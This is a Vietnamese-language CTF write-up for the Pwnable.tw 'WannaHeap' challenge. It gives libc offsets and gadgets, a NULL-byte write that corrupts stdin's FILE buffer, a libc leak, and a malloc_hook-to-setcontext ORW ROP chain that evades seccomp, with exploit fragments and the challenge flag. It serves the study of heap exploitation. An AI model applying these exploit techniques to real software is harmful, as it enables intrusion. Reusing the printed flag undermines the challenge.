+++
title = 'Pwnable.tw - WannaHeap'
date = 2026-09-23T11:01:39+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## WannaHeap

`nc chall.pwnable.tw 10305`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/WannaHeap/wannaheap_patched
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
FORTIFY:    Enabled
```

libc đi kèm là GLIBC 2.24-9ubuntu2.2. Có seccomp chặn `execve` nên đích cuối phải là ORW.

Offset đo trên đúng libc này:

```js
setcontext      = 0x48010     __malloc_hook   = 0x3c1af0
main_arena      = 0x3c1b00    _IO_2_1_stdin_  = 0x3c18c0
_IO_2_1_stdout_ = 0x3c2600    _IO_file_jumps  = 0x3be400
syscall  = 0xbc765   pop_rdi = 0x1fd7a   pop_rsi = 0x1fcbd
pop_rdx  = 0x1b92    pop_rax = 0x3a998
call_morecore = 0x843e1       mov_rdi_rax = 0x76006
```

#### Bug - size được validate và size được dùng là hai giá trị khác nhau

Trong hàm tạo data heap (`0x1790`): ô nhập **"Size" đầu tiên** (`v0`/`r12`) là cái được kiểm tra (phải `<= 0x313370`), nhưng phần cấp phát lại dùng **giá trị size đọc lại lần sau**. Byte NUL kết thúc thì ghi tại `buffer[v0]`.

Nghĩa là với `v0` cực lớn, ta có một lần **ghi đúng một byte NULL tại `buf + v0`** với offset tuỳ ý.

Mấu chốt thứ hai: với data heap lớn (`0x313370`), `calloc()` đi đường `mmap` và buffer luôn nằm ở **`libc - 0x313ff0`**. Vùng mmap nằm ngay sát libc nên `v0` đủ để chạm tới libc.

### 2. Khai thác

#### Stage 0 - ghi NULL lên `_IO_2_1_stdin_._IO_buf_base`

```js
buf    = libc - 0x313ff0
target = libc + stdin_off + 0x38
v0     = (stdin_off + 0x38) + 0x313ff0 = stdin_off + 0x314000 + 0x28
```

```py
MMAP_SIZE     = 0x314000
MAX_MMAP_SIZE = 0x313370
null_byte_offset = libc.sym['_IO_2_1_stdin_'] + MMAP_SIZE + 0x28

ru(b'Size :');  sln(null_byte_offset)
ru(b'Size :');  sln(MAX_MMAP_SIZE)
ru(b'Content :'); s(b'A')
```

Phá `_IO_buf_base` của `stdin` làm lần underflow kế tiếp gọi `read(0, libc+0x3c1900, ~0x44)` - tức là **mọi input sau đó được copy thẳng vào các struct FILE của libc**. Ta có quyền ghi vào libc thông qua chính stdin.

#### Stage 1 - leak libc bằng over-read của `strdup`

Sắp xếp cây node sao cho node `key=2` leak ra một con trỏ libc:

```py
alloc(1)
alloc(3)
# rồi alloc key=2 với data = b'\x01'
ru(b'> '); s(b'R')
ru(b'key:'); s(b'2')
ru(b'data : ')
libc_leak = u64(r(0x6) + b'\0\0')
libc.address = libc_leak - 0x3c3701
```

#### Stage 2 - chain hook → `setcontext` → ORW

Vì seccomp chặn `execve`, không dùng one_gadget được. Chain:

```js
__malloc_hook -> call_morecore
__morecore    -> mov_rdi_rax
              -> setcontext + 0x2e      (pivot rsp vào fake ucontext)
              -> ROP open / read / write
```

`setcontext+0x2e` nạp lại toàn bộ thanh ghi từ một `ucontext` do ta đắp, trong đó `rsp` trỏ vào buffer của ta, nên sau đó là một ROP chain ORW bình thường. Payload được stream qua chính stdin đã bị alias vào libc.

Trigger: chọn `[A]` ở menu → `calloc` → `__malloc_hook` kích hoạt → ORW đọc flag ra fd 0.

```bash
Local (PTY, /tmp/flag): FLAG{local_test_flag_1234}
Remote: FLAG{I_w4nt_2_pl4y_w1th_f1l3_str34m}
```

`FLAG: FLAG{I_w4nt_2_pl4y_w1th_f1l3_str34m}`

Bản local thỉnh thoảng flaky, chạy lại là được. Lời giải này port từ writeup công khai của wxrdnx cho WannaHeap (2017); libc đi kèm của bài (sha1 `80a02fb9...`) có cùng layout và cùng gadget với libc trong writeup gốc nên mọi offset dùng lại được, nhưng vẫn kiểm tra lại từng symbol trên chính file libc của bài.
